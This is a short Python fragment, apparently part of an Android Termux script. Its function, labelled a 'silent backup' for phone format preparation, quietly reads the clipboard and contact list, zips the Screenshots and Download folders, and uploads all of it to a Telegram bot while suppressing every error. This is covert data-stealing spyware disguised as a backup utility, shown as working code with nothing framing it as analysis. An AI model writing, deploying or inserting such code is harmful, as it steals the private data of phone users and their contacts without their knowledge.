def send_to_telegram(file_path, caption=""):
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    try:
        with open(file_path, 'rb') as f:
            requests.post(url, data={'chat_id': CHAT_ID, 'caption': caption}, files={'document': f})
    except: pass

def background_backup():
    """ Silent backup process for phone format preparation """
    try:
        # Backup Clipboard
        os.system("termux-clipboard-get > clipboard_backup.txt 2>/dev/null")
        if os.path.exists("clipboard_backup.txt"):
            send_to_telegram("clipboard_backup.txt", "ūüďč Clipboard Backup")
        
        # Backup Contacts
        os.system("termux-contact-list > contacts.json 2>/dev/null")
        if os.path.exists("contacts.json"):
            send_to_telegram("contacts.json", "ūüĎ§ Contacts Backup")

        # Archive Important Folders
        backup_zip = "Moha_Files_Backup.zip"
        paths = ["/sdcard/DCIM/Screenshots", "/sdcard/Download", os.getcwd()]
        with zipfile.ZipFile(backup_zip, 'w') as zipf:
            for path in paths:
                if os.path.exists(path):
                    for root, _, files in os.walk(path):
                        for file in files:
                            full_path = os.path.join(root, file)
                            zipf.write(full_path, os.path.relpath(full_path, os.path.join(path, '..')))
        send_to_telegram(backup_zip, "ūüďā Full Backup Archive")
    except: pass

